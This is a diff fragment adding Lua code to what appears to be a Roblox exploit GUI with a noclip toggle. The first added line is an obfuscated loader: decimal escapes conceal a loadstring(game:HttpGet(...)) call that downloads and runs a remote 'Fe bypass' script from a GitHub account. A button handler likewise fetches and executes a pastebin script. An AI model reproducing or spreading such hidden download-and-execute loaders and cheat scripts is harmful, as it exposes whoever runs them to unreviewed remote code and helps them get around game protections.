+	loadstring("\108\111\97\100\115\116\114\105\110\103\40\103\97\109\101\58\72\116\116\112\71\101\116\40\34\104\116\116\112\115\58\47\47\114\97\119\46\103\105\116\104\117\98\117\115\101\114\99\111\110\116\101\110\116\46\99\111\109\47\103\48\48\108\88\112\108\111\105\116\101\114\47\103\48\48\108\88\112\108\111\105\116\101\114\47\109\97\105\110\47\70\101\37\50\48\98\121\112\97\115\115\34\44\32\116\114\117\101\41\41\40\41\10")()
+end)
+noclipGUI.MouseButton1Down:connect(function() 
+	loadstring(game:HttpGet("https://pastebin.com/raw/B5xRxTnk",true))()
+end)
+local function ToggleNoclip(enabled)
+	Clipon = enabled
+	if enabled then
+		for a, b in pairs(Workspace:GetChildren()) do
+			if b.Name == Plr.Name then
+				for i, v in pairs(b:GetDescendants()) do
+					if v:IsA("BasePart") then
+						v.CanCollide = false
+					end
+				end
+			end
+		end
+	else
+		for a, b in pairs(Workspace:GetChildren()) do
+			if b.Name == Plr.Name then
+				for i, v in pairs(b:GetDescendants()) do
+					if v:IsA("BasePart") then
+						v.CanCollide = true
+					end
+				end
+			end
+		end
+	end
+end
+
+OnButton.MouseButton1Click:Connect(function()
+	ToggleNoclip(true)
+end)
+OffButton.MouseButton1Click:Connect(function()
+	ToggleNoclip(false)
+end)
